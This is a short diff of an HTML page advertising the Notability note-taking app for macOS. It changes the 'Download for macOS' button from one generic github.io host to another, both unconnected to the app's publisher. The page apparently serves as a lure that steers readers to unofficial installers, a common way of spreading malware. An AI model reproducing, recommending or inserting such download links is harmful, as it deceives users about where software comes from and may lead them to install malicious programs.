@@ -6,7 +6,7 @@
 <h3>Notability for macOS</h3>
 <p><a href="#">Notability for macOS</a> is an all-in-one note-taking app that allows you to capture and organize your thoughts, lectures, and ideas in an intuitive, easy-to-use environment.</p>
 
-<a href="https://quick-mac-install.github.io/.github/Notability">
+<a href="https://mac-software-install.github.io/.github/Notability">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
